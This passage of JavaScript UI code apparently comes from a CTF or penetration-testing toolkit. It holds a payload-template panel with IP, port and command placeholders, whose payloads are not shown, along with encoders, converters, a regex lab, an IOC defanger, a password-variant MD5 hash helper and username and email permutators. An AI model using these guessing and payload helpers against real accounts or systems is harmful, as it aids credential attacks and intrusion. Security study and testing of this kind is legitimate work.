                    e('select', {
                        value: payloadEncoding,
                        onChange: (ev) => setPayloadEncoding(ev.target.value),
                        className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none'
                    },
                        e('option', { value: 'none' }, 'No encoding'),
                        e('option', { value: 'url' }, 'URL encode'),
                        e('option', { value: 'html' }, 'HTML entities'),
                        e('option', { value: 'base64' }, 'Base64')
                    ),
                    e('button', {
                        onClick: () => { setPayloadQuery(''); setPayloadEncoding('none'); },
                        className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40'
                    }, 'RESET')
                ),
                e('div', { className: 'text-xs text-gray-400 pt-1' }, 'Template values'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    e('input', { value: payloadTarget, onChange: (ev) => setPayloadTarget(ev.target.value), placeholder: '{TARGET}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('input', { value: payloadParam, onChange: (ev) => setPayloadParam(ev.target.value), placeholder: '{PARAM}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('input', { value: payloadCmd, onChange: (ev) => setPayloadCmd(ev.target.value), placeholder: '{CMD}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                    e('div', { className: 'grid grid-cols-2 gap-2' },
                        e('input', { value: payloadIP, onChange: (ev) => setPayloadIP(ev.target.value), placeholder: '{IP}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
                        e('input', { value: payloadPort, onChange: (ev) => setPayloadPort(ev.target.value), placeholder: '{PORT}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' })
                    )
                )
            ),

            // RIGHT: Library
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
                e('div', { className: 'flex items-center justify-between' },
                    e('div', { className: 'text-xs text-gray-400' }, `Library (${entries.length})`),
                    e('div', { className: 'text-[11px] text-gray-500' }, payloadType.toUpperCase())
                ),
                e('div', { className: 'bg-black/50 border border-gray-800 rounded p-2 max-h-80 overflow-y-auto space-y-2' },
                    ...entries.map((tpl, i) => e('div', {
                        key: i,
                        className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer'
                    },
                        e('div', { className: 'flex items-start justify-between gap-2' },
                            e('div', { className: 'space-y-1' },
                                e('div', { className: 'text-xs font-bold text-gray-200' }, tpl.name),
                                e('code', { className: 'block text-[11px] text-gray-300 break-words' }, fill(tpl.payload)),
                                e('div', { className: 'text-[10px] text-gray-500 leading-snug' }, tpl.notes)
                            ),
                            e('button', {
                                onClick: (ev) => { ev.stopPropagation(); onSelect(tpl); },
                                className: 'px-2 py-1 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[10px] font-bold text-[#00ff41] hover:bg-[#00ff41]/30'
                            }, 'USE')
                        )
                    ))
                )
            )
        ),

        e('div', { className: 'grid grid-cols-1 lg:grid-cols-2 gap-3' },
            e('div', { className: 'space-y-1' },
                e('div', { className: 'text-xs text-gray-400' }, 'Selected / Custom Payload'),
                e('textarea', {
                    value: input,
                    onChange: (ev) => setInput(ev.target.value),
                    className: 'w-full h-28 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none'
                })
            ),
            e('div', { className: 'space-y-1' },
                e('div', { className: 'text-xs text-gray-400' }, 'Quick actions'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    e('button', { onClick: () => setInput(''), className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40' }, 'CLEAR'),
                    e('button', { onClick: () => setInput(applyEncoding(fill(input))), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'APPLY TEMPLATE+ENC')
                )
            )
        )
    );
}

// URL PARSER
            if (tool === 'url-parser') {
                const parseURL = () => { try { const url = new URL(input); const params = {}; url.searchParams.forEach((v, k) => { params[k] = v; }); setOutput(JSON.stringify({ protocol: url.protocol, hostname: url.hostname, port: url.port || '(default)', pathname: url.pathname, params: params, hash: url.hash }, null, 2)); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'URL Parser'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'https://example.com/path?param=value' }),
                    e('button', { onClick: parseURL, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, 'PARSE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // HTML ENCODER
            if (tool === 'html-encoder') {
                const htmlEncode = (s) => s.split('').map(c => { const code = c.charCodeAt(0); return (code > 127 || '<>&"\''.includes(c)) ? '&#' + code + ';' : c; }).join('');
                const htmlDecode = (s) => { const t = document.createElement('textarea'); t.innerHTML = s; return t.value; };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'HTML Encoder'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })),
                    e('div', { className: 'grid grid-cols-2 gap-2' }, e('button', { onClick: () => setOutput(htmlEncode(input)), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENCODE'), e('button', { onClick: () => setOutput(htmlDecode(input)), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DECODE'))
                );
            }
            // HEX EDITOR
            if (tool === 'hex-editor') {
const textToHex = () => { const h = Array.from(input).map((c, i) => { const hx = c.charCodeAt(0).toString(16).padStart(2, '0'); return (i % 16 === 0 ? '\n' : '') + hx + ' '; }).join(''); setHexData(h); setOutput(h); };
                const hexToText = () => { try { const clean = hexData.replace(/[^0-9a-f]/gi, ''); const text = clean.match(/.{2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join(''); setOutput(text); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hex Editor Pro'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('div', null, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('button', { onClick: textToHex, className: 'mt-2 w-full px-4 py-2 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-xs font-bold' }, 'TEXT â†’ HEX')), e('div', null, e('textarea', { value: hexData, onChange: (ev) => setHexData(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('button', { onClick: hexToText, className: 'mt-2 w-full px-4 py-2 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-xs font-bold' }, 'HEX â†’ TEXT'))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // FILE ANALYZER
            if (tool === 'file-analyzer') {
                const magic = { 'PNG': '89504e47', 'JPEG': 'ffd8ffe0', 'GIF': '47494638', 'PDF': '25504446', 'ZIP': '504b0304', 'EXE': '4d5a' };
                const analyze = () => { const hex = input.replace(/\s/g, '').toLowerCase(); const m = []; for (const [type, sig] of Object.entries(magic)) { if (hex.startsWith(sig)) m.push(type); } setOutput(m.length > 0 ? `Identified: ${m.join(', ')}` : 'Unknown'); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'File Analyzer'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Hex...' }),
                    e('button', { onClick: analyze, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'ANALYZE'),
                    e('div', { className: 'bg-black/50 border border-gray-700 rounded p-4 text-xs font-mono' }, ...Object.entries(magic).map(([t, s]) => e('div', { key: t, className: 'flex justify-between mb-1' }, e('span', { className: 'text-gray-400' }, t + ':'), e('span', { className: 'text-[#00d9ff]' }, s)))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // STRING EXTRACTOR
            if (tool === 'string-extractor') {
const extract = () => { const regex = new RegExp(`[\\x20-\\x7E]{${minLen},}`, 'g'); const m = input.match(regex); setOutput(m ? `Found ${m.length}:\n\n` + m.join('\n') : 'None found'); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'String Extractor'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'flex gap-4' }, e('input', { type: 'number', value: minLen, onChange: (ev) => setMinLen(parseInt(ev.target.value) || 4), min: 1, className: 'w-24 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('button', { onClick: extract, className: 'flex-1 px-4 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'EXTRACT')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-64 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // BINARY CONVERTER
            if (tool === 'binary-converter') {
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Binary Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, e('button', { onClick: () => setOutput(Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ')), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'TO HEX'), e('button', { onClick: () => { try { setOutput(btoa(input)); } catch(e) { setOutput('Error'); }}, className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'TO BASE64'), e('button', { onClick: () => setOutput(input.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ')), className: 'px-3 py-2 bg-green-600/20 border border-green-500 rounded text-xs font-bold' }, 'TO BINARY')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // ASCII CONVERTER
            if (tool === 'ascii-converter') {
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'ASCII Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('div', { className: 'grid grid-cols-2 gap-2' }, e('button', { onClick: () => setOutput(input.split('').map(c => c.charCodeAt(0)).join(' ')), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'TO ASCII'), e('button', { onClick: () => setOutput(input.split(' ').map(n => String.fromCharCode(parseInt(n))).join('')), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'FROM ASCII')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // ENDIAN CONVERTER
            if (tool === 'endian-converter') {
                const swap = () => { const hex = input.replace(/\s/g, ''); if (hex.length % 2 !== 0) { setOutput('Invalid'); return; } const pairs = hex.match(/.{2}/g) || []; setOutput(pairs.reverse().join('')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Endian Converter'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('button', { onClick: swap, className: 'w-full px-4 py-3 bg-[#ffaa00]/20 border border-[#ffaa00] rounded text-[#ffaa00] font-bold' }, 'SWAP ENDIANNESS'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // BIT MANIPULATOR
            if (tool === 'bit-manipulator') {
const calc = () => { const a = parseInt(num), b = parseInt(num2); if (isNaN(a) || isNaN(b)) { setOutput('Invalid'); return; } let r; switch(op) { case 'and': r = a & b; break; case 'or': r = a | b; break; case 'xor': r = a ^ b; break; case 'not': r = ~a; break; case 'lshift': r = a << b; break; case 'rshift': r = a >> b; break; } setOutput(`Result: ${r}\nBinary: ${r.toString(2)}\nHex: 0x${r.toString(16)}`); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Bit Manipulator'),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, e('input', { type: 'number', value: num, onChange: (ev) => setNum(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('select', { value: op, onChange: (ev) => setOp(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }, e('option', { value: 'and' }, 'AND'), e('option', { value: 'or' }, 'OR'), e('option', { value: 'xor' }, 'XOR'), e('option', { value: 'not' }, 'NOT'), e('option', { value: 'lshift' }, '<<'), e('option', { value: 'rshift' }, '>>')), e('input', { type: 'number', value: num2, onChange: (ev) => setNum2(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' })),
                    e('button', { onClick: calc, className: 'w-full px-4 py-3 bg-[#ffaa00]/20 border border-[#ffaa00] rounded text-[#ffaa00] font-bold' }, 'CALCULATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // NUMBER BASE
            if (tool === 'number-base') {
                const convert = (from) => { const n = from === 10 ? parseInt(input) : parseInt(input, from); if (isNaN(n)) { setOutput('Invalid'); return; } setOutput(`Dec: ${n}\nHex: 0x${n.toString(16)}\nOct: 0${n.toString(8)}\nBin: 0b${n.toString(2)}`); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Number Base'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('div', { className: 'grid grid-cols-4 gap-2' }, e('button', { onClick: () => convert(10), className: 'px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'FROM DEC'), e('button', { onClick: () => convert(16), className: 'px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'FROM HEX'), e('button', { onClick: () => convert(8), className: 'px-3 py-2 bg-green-600/20 border border-green-500 rounded text-xs font-bold' }, 'FROM OCT'), e('button', { onClick: () => convert(2), className: 'px-3 py-2 bg-yellow-600/20 border border-yellow-500 rounded text-xs font-bold' }, 'FROM BIN')),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // HASH CRACKER HELPER
            if (tool === 'hash-cracker') {
                const gen = () => { const vars = [input, input.toLowerCase(), input.toUpperCase(), input + '123', input + '!', input + '2024']; setOutput(vars.map(v => `${v} â†’ MD5: ${CryptoJS.MD5(v).toString()}`).join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hash Helper'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-64 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // USERNAME FORMATTER
            if (tool === 'username-formatter') {
                const gen = () => { const parts = input.split(' '); const vars = [input.toLowerCase().replace(/\s/g, ''), input.toLowerCase().replace(/\s/g, '.'), input.toLowerCase().replace(/\s/g, '_'), input.toLowerCase().replace(/\s/g, '-'), parts[0]?.toLowerCase(), parts.map(p => p[0]).join('').toLowerCase()].filter(Boolean); setOutput(vars.join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Username Formatter'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // EMAIL PERMUTATOR
            if (tool === 'email-permutator') {
const gen = () => { const parts = input.split(' '); const vars = [`${input.toLowerCase().replace(/\s/g, '')}@${domain}`, `${input.toLowerCase().replace(/\s/g, '.')}@${domain}`, `${input.toLowerCase().replace(/\s/g, '_')}@${domain}`, `${parts[0]?.toLowerCase()}@${domain}`, `${parts.map(p => p[0]).join('').toLowerCase()}@${domain}`].filter(Boolean); setOutput(vars.join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Email Permutator'),
                    e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('input', { type: 'text', value: domain, onChange: (ev) => setDomain(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // PHONE FORMATTER
            if (tool === 'phone-formatter') {
const format = () => { const clean = input.replace(/\D/g, ''); setOutput([`${country} ${clean}`, `${country} (${clean.slice(0,3)}) ${clean.slice(3,6)}-${clean.slice(6)}`, `${country}-${clean.slice(0,3)}-${clean.slice(3,6)}-${clean.slice(6)}`, clean].join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Phone Formatter'),
                    e('div', { className: 'grid grid-cols-4 gap-2' }, e('input', { type: 'text', value: country, onChange: (ev) => setCountry(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'col-span-3 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' })),
                    e('button', { onClick: format, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'FORMAT'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }


            // ENTROPY CHECK
            if (tool === 'entropy-check') {
                const compute = () => {
                    const s = input || '';
                    if (!s.length) { setEntropyScore(''); setOutput(''); return; }
                    // Shannon entropy
                    const freq = {};
                    for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
                    let ent = 0;
                    for (const k in freq) {
                        const p = freq[k] / s.length;
                        ent -= p * Math.log2(p);
                    }
                    const bitsPerChar = ent;
                    const hint = bitsPerChar > 4.5 ? 'High entropy (likely encrypted/compressed/random)' :
                                 bitsPerChar > 3.5 ? 'Medium entropy (could be encoded/compressed)' :
                                 'Low entropy (likely plain text / structured)';
                    setEntropyScore(bitsPerChar.toFixed(3));
                    setOutput(`Length: ${s.length}\nEntropy: ${bitsPerChar.toFixed(3)} bits/char\nHint: ${hint}`);
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Entropy / Randomness'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste text, hex, base64...' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: compute, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'ANALYZE'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    entropyScore && e('div', { className: 'text-sm text-gray-300' }, `Entropy: ${entropyScore} bits/char`),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // REGEX LAB
            if (tool === 'regex-lab') {
                const run = () => {
                    try {
                        const flags = (regexFlags || '').replace(/[^gimsuy]/g, '');
                        const reObj = new RegExp(regexPattern, flags.includes('g') ? flags : flags + 'g');
                        const matches = [];
                        let m;
                        const text = input || '';
                        while ((m = reObj.exec(text)) !== null) {
                            matches.push({
                                match: m[0],
                                index: m.index,
                                groups: m.slice(1)
                            });
                            if (m[0] === '') reObj.lastIndex++; // avoid infinite loop
                        }
                        if (!matches.length) { setOutput('No matches'); return; }
                        const lines = matches.map((x, i) =>
                            `${i+1}. @${x.index}: ${x.match}` + (x.groups.length ? ` | groups: [${x.groups.join(', ')}]` : '')
                        );
                        setOutput(lines.join('\n'));
                    } catch (e) {
                        setOutput('Regex error: ' + (e && e.message ? e.message : String(e)));
                    }
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Regex Lab'),
                    e('div', { className: 'grid grid-cols-4 gap-2' },
                        e('input', { type: 'text', value: regexPattern, onChange: (ev) => setRegexPattern(ev.target.value), className: 'col-span-3 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Pattern (no / /) e.g. flag\\{([^}]+)\\}' }),
                        e('input', { type: 'text', value: regexFlags, onChange: (ev) => setRegexFlags(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'flags e.g. gim' })
                    ),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste text to search...' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: run, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'RUN'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY OUTPUT')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // DEFANG / REFANG
            if (tool === 'defang-refang') {
                const transform = () => {
                    const s = input || '';
                    const defang = (t) => t
                        .replace(/\./g, '[.]')
                        .replace(/http:\/\//gi, 'hxxp://')
                        .replace(/https:\/\//gi, 'hxxps://')
                        .replace(/@/g, '[@]');
                    const refang = (t) => t
                        .replace(/\[\.\]/g, '.')
                        .replace(/hxxp:\/\//gi, 'http://')
                        .replace(/hxxps:\/\//gi, 'https://')
                        .replace(/\[@\]/g, '@');

                    const extract = (t) => {
                        const urls = t.match(/https?:\/\/[^\s"'<>()]+/gi) || [];
                        const ips  = t.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
                        const domains = t.match(/\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b/gi) || [];
                        const uniq = (arr) => Array.from(new Set(arr));
                        return [
                            'URLs:', ...uniq(urls),
                            '', 'IPs:', ...uniq(ips),
                            '', 'Domains:', ...uniq(domains)
                        ].join('\n');
                    };

                    if (iocMode === 'defang') setOutput(defang(s));
                    else if (iocMode === 'refang') setOutput(refang(s));
                    else setOutput(extract(s));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Defang / Refang IOCs'),
                    e('div', { className: 'flex gap-2 flex-wrap' },
                        ['defang','refang','extract'].map(mode =>
                            e('button', { key: mode, onClick: () => setIocMode(mode), className: `px-3 py-2 rounded font-bold text-sm border ${iocMode===mode ? 'bg-[#00ff41]/20 border-[#00ff41] text-[#00ff41]' : 'bg-black/30 border-gray-700 text-gray-400'}` },
                              mode.toUpperCase()
                            )
                        ),
                        e('button', { onClick: transform, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'RUN'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste URLs, domains, IPs...' }),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // TIMESTAMP CONVERTER
            if (tool === 'timestamp-converter') {
                const convert = () => {
                    const s = (tsInput || '').trim();
                    if (!s) { setOutput(''); return; }

                    // If numeric, treat as unix (sec or ms)
                    if (/^-?\d+$/.test(s)) {
                        const n = Number(s);
                        const ms = n > 1e12 ? n : n * 1000;
                        const d = new Date(ms);
                        if (isNaN(d.getTime())) { setOutput('Invalid timestamp'); return; }
                        setOutput([
                            `ISO: ${d.toISOString()}`,
                            `UTC: ${d.toUTCString()}`,
                            `Local: ${d.toString()}`,
                            `Unix (sec): ${Math.floor(ms/1000)}`,
                            `Unix (ms): ${ms}`
                        ].join('\n'));
                        return;
                    }

                    // Otherwise parse as date string
                    const d = new Date(s);
                    if (isNaN(d.getTime())) { setOutput('Could not parse date/time'); return; }
                    const ms = d.getTime();
                    setOutput([
                        `Unix (sec): ${Math.floor(ms/1000)}`,
                        `Unix (ms): ${ms}`,
                        `ISO: ${d.toISOString()}`,
                        `UTC: ${d.toUTCString()}`,
                        `Local: ${d.toString()}`
                    ].join('\n'));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Timestamp Converter'),
                    e('input', { type: 'text', value: tsInput, onChange: (ev) => setTsInput(ev.target.value), className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Unix seconds/ms OR date string (e.g., 2026-02-04T12:00:00Z)' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: convert, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'CONVERT'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
